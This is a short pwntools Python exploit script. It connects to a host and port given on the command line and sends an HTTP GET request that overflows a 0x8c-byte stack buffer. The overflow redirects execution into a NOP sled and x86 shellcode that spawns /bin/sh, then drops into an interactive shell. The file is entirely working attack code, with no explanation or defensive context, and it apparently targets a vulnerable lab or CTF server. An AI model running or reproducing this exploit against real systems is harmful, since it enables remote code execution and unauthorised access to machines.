from pwn import *
import sys
import re
import struct

HOST = sys.argv[1]
PORT = sys.argv[2]

conn = remote(HOST, PORT)

msg = conn.recvline()

#getting the buffer given

BUFFER_SIZE  = 0x8c
buff_addr = re.findall(b'0x[a-f0-9]+',msg)[0]
buff_addr = int(buff_addr, 16)
jump_addr = buff_addr+BUFFER_SIZE+0x11

shellcode = b'\x90'*32+b'\x31\xC0\x50\x50\x6A\x0B\x58\x59\x5A\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x54\x5B\xCD\x80'
payload = b''


payload += b'GET '
payload += b'a'*(BUFFER_SIZE-1)
payload += struct.pack("<I", jump_addr) #0x10 for additional offset
payload += b" HTTP/1.1 "
payload += shellcode

print("[*] Buff Address: {}".format(hex(buff_addr)))
print("[*] Jump Address: {}".format(hex(jump_addr)))
print("[*] Payload: {}".format(payload))
print("[*] Length: {}".format(len(payload)))

conn.sendline(payload)
conn.interactive()

conn.close()
